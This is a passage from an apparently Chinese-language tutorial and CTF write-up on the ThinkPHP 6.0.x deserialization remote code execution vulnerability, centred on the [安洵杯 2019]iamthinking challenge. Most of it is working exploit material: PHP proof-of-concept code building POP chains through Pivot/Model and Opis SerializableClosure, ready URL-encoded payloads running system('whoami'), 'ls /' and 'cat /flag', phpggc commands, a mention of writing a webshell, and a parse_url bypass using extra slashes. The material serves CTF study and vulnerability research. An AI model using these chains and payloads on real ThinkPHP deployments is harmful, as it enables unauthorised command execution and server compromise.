        }
    }
    namespace think\model;
    use think\Model;
    class Pivot extends Model
    {
    }
    $a = new Pivot();
    $b = new Pivot($a);
    echo urlencode(serialize($b));
运行得到payload：
    O%3A17%3A%22think%5Cmodel%5CPivot%22%3A7%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A12%3A%22%00%2A%00withEvent%22%3Bb%3A0%3Bs%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A18%3A%22%00think%5CModel%00force%22%3Bb%3A1%3Bs%3A8%3A%22%00%2A%00table%22%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A7%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A12%3A%22%00%2A%00withEvent%22%3Bb%3A0%3Bs%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A18%3A%22%00think%5CModel%00force%22%3Bb%3A1%3Bs%3A8%3A%22%00%2A%00table%22%3Bs%3A0%3A%22%22%3Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A8%3A%22evil_key%22%3Bs%3A6%3A%22whoami%22%3B%7Ds%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A8%3A%22evil_key%22%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A8%3A%22evil_key%22%3Bs%3A6%3A%22whoami%22%3B%7Ds%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A8%3A%22evil_key%22%3Bs%3A6%3A%22system%22%3B%7D%7D
最后，利用我们该开始在Index控制器中创建的可控的反序列化点执行即可：
如上图，成功执行命令。
## 利用SerializableClosure来构造payload
还有一种方法就是用 ThinkPHP 自带的 SerializableClosure 来调用，我们来看一下这个方法。
主要是上面getValue()方法里的漏洞点，也就是构造pop链的最后的地方：
    $closure = $this->withAttr[$fieldName];
    $value = $closure($value, $this->data);
我们通过一步步控制 `$closure` 和 `$this->data` 最后构造并执行了动态函数。但是由于参数的限制，通过第一种方法我们无法执行
`phpinfo()` 这样的函数，所以我们尝试另一种方法，也就是利用 SerializableClosure。
[\Opis\Closure
](https://github.com/opis/closure)可用于序列化匿名函数，使得匿名函数同样可以进行序列化操作。这意味着我们可以序列化一个匿名函数，然后交由上述的
`$closure($value, $this->data)` 调用执行，即：
    $func = function(){phpinfo();};
    $closure = new \Opis\Closure\SerializableClosure($func);
    $closure($value, $this->data);  // 这里的参数可以不用管
以上述代码为例，将调用phpinfo()函数。同样也可以通过将 `phpinfo();` 改为别的来写webshell。
修改上面的POC即可：
    exists = true;
            $this->force = true;
        $this->lazySave = true;
        $this->withEvent = false;
            $this->suffix = $a;
            $this->data=['jiang'=>''];
            $c=unserialize($b); 
        $this->withAttr=['jiang'=>$c];
        }
    }
    namespace think\model;
    use think\Model;
    class Pivot extends Model{}
    require 'closure/autoload.php';
    echo urlencode(serialize(new Pivot(new Pivot())));
    ?>
然后我们要执行这个POC生成payload。虽然 thinkphp 有自带的
`SerializableClosure`，但是我需要在本地执行POC，所以就要自行下载 \Opis\Closure：
将下载的Closure与POC放在同一目录
然后执行POC即可生成payload：
    O%3A17%3A%22think%5Cmodel%5CPivot%22%3A7%3A%7Bs%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A18%3A%22%00think%5CModel%00force%22%3Bb%3A1%3Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A9%3A%22%00%2A%00suffix%22%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A7%3A%7Bs%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A18%3A%22%00think%5CModel%00force%22%3Bb%3A1%3Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A9%3A%22%00%2A%00suffix%22%3Bs%3A0%3A%22%22%3Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A5%3A%22jiang%22%3Bs%3A0%3A%22%22%3B%7Ds%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A5%3A%22jiang%22%3BC%3A32%3A%22Opis%5CClosure%5CSerializableClosure%22%3A163%3A%7Ba%3A5%3A%7Bs%3A3%3A%22use%22%3Ba%3A0%3A%7B%7Ds%3A8%3A%22function%22%3Bs%3A23%3A%22function%28%29%7B%5Cphpinfo%28%29%3B%7D%22%3Bs%3A5%3A%22scope%22%3Bs%3A11%3A%22think%5CModel%22%3Bs%3A4%3A%22this%22%3BN%3Bs%3A4%3A%22self%22%3Bs%3A32%3A%22000000007ff4c7fb000000003d8ec45f%22%3B%7D%7D%7Ds%3A12%3A%22%00%2A%00withEvent%22%3Bb%3A0%3B%7Ds%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A5%3A%22jiang%22%3Bs%3A0%3A%22%22%3B%7Ds%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A5%3A%22jiang%22%3BC%3A32%3A%22Opis%5CClosure%5CSerializableClosure%22%3A163%3A%7Ba%3A5%3A%7Bs%3A3%3A%22use%22%3Ba%3A0%3A%7B%7Ds%3A8%3A%22function%22%3Bs%3A23%3A%22function%28%29%7B%5Cphpinfo%28%29%3B%7D%22%3Bs%3A5%3A%22scope%22%3Bs%3A11%3A%22think%5CModel%22%3Bs%3A4%3A%22this%22%3BN%3Bs%3A4%3A%22self%22%3Bs%3A32%3A%22000000007ff4c7f5000000003d8ec45f%22%3B%7D%7D%7Ds%3A12%3A%22%00%2A%00withEvent%22%3Bb%3A0%3B%7D
但是SerializableClosure这个方法我在本地没有利用成功，但在最后面安询杯拿到题目里面成功了，不知道为什么。
执行效果如下：
## 利用phpggc工具生成paylaod
下载地址：
phpggc是一个反序列化payload生成工具。网上一个大佬已经将ThinkPHP6反序列化的exp添加进[phpggc](https://github.com/wh1t3p1g/phpggc)中，需要安装在linux上，然后执行以下命令生成即可生成payload：
    php ./phpggc -u thinkphp/rce2 'phpinfo();'
    php ./phpggc -u thinkphp/rce2 "system('whoami');"
    # php ./phpggc thinkphp/rce2 
但这里由于用到了SerializableClosure，需要使用编码器编码，不可直接输出拷贝利用。
## CTF实战：[安洵杯 2019]iamthinking
[安洵杯 2019]iamthinking这道题目利用的就是ThinkPHP V6.0.x 反序列化漏洞。
进入题目，让我们访问/public/目录：
随便构造一个错误发现是thinkphp6的环境，并且提示我们要RCE：
题目给出了源码www.zip。拿到源码先看Index控制器：
这也太简单了，让我们用GET方法传入payload，然后将payload反序列化，不过事先要绕过绕过parse_url函数。
我们可以通过上面的POC构造payload：
     "ls /"];   // 查看根目录文件
        // private $data = ["evil_key" => "cat /flag"];   // 读取flag
        private $withAttr = ["evil_key" => "system"];
    }
    namespace think;
    abstract class Model
    {
        use model\concern\Attribute;
        private $lazySave;
        protected $withEvent;
        private $exists;
        private $force;
        protected $table;
        function __construct($obj = '')
        {
            $this->lazySave = true;
            $this->withEvent = false;
            $this->exists = true;
            $this->force = true;
            $this->table = $obj;
        }
    }
    namespace think\model;
    use think\Model;
    class Pivot extends Model
    {
    }
    $a = new Pivot();
    $b = new Pivot($a);
    echo urlencode(serialize($b));
首先，我们查看根目录的文件，得到payload：
    O%3A17%3A%22think%5Cmodel%5CPivot%22%3A7%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A12%3A%22%00%2A%00withEvent%22%3Bb%3A0%3Bs%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A18%3A%22%00think%5CModel%00force%22%3Bb%3A1%3Bs%3A8%3A%22%00%2A%00table%22%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A7%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A12%3A%22%00%2A%00withEvent%22%3Bb%3A0%3Bs%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A18%3A%22%00think%5CModel%00force%22%3Bb%3A1%3Bs%3A8%3A%22%00%2A%00table%22%3Bs%3A0%3A%22%22%3Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A8%3A%22evil_key%22%3Bs%3A4%3A%22ls+%2F%22%3B%7Ds%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A8%3A%22evil_key%22%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A8%3A%22evil_key%22%3Bs%3A4%3A%22ls+%2F%22%3B%7Ds%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A8%3A%22evil_key%22%3Bs%3A6%3A%22system%22%3B%7D%7D
然后，就要绕过parse_url函数对payload中“O”的检测，parse_url函数有个bug，即在 **域名（主机名）** 后面多加了两个斜杠
`/` 后会报错返回false，所以我们构造类似如下的url即可绕过parse_url函数的检测：
    http://xxx.com///public/?payload=O%3A17%3A%22think%5Cmodel%5CPivot......%3Bs%3A6%3A%22system%22%3B%7D%7D
这是因为多加了几个 `/` 后导致严重不合格的
URL，此时将不能正常返回url中的参数值，遇到这样格式的连接，parse_url函数将会报错返回False，这种情况下可能会绕过某些waf的过滤。
如下成功执行命令：
读取flag：
    http://xxx.com///public/?payload=O%3A17%3A%22think%5Cmodel%5CPivot%22%3A7%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A12%3A%22%00%2A%00withEvent%22%3Bb%3A0%3Bs%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A18%3A%22%00think%5CModel%00force%22%3Bb%3A1%3Bs%3A8%3A%22%00%2A%00table%22%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A7%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A12%3A%22%00%2A%00withEvent%22%3Bb%3A0%3Bs%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A18%3A%22%00think%5CModel%00force%22%3Bb%3A1%3Bs%3A8%3A%22%00%2A%00table%22%3Bs%3A0%3A%22%22%3Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A8%3A%22evil_key%22%3Bs%3A9%3A%22cat+%2Fflag%22%3B%7Ds%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A8%3A%22evil_key%22%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A8%3A%22evil_key%22%3Bs%3A9%3A%22cat+%2Fflag%22%3B%7Ds%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A8%3A%22evil_key%22%3Bs%3A6%3A%22system%22%3B%7D%7D
成功。
还可以利用上面提到的[phpggc](https://github.com/wh1t3p1g/phpggc)工具来生成payload：
    php ./phpggc -u thinkphp/rce2 'phpinfo();'
    php ./phpggc -u thinkphp/rce2 "system('cat /flag');"
    # php ./phpggc thinkphp/rce2 
## Ending......
> 参考：
>
> 
>
> 
>
> 
>
> 
>
> 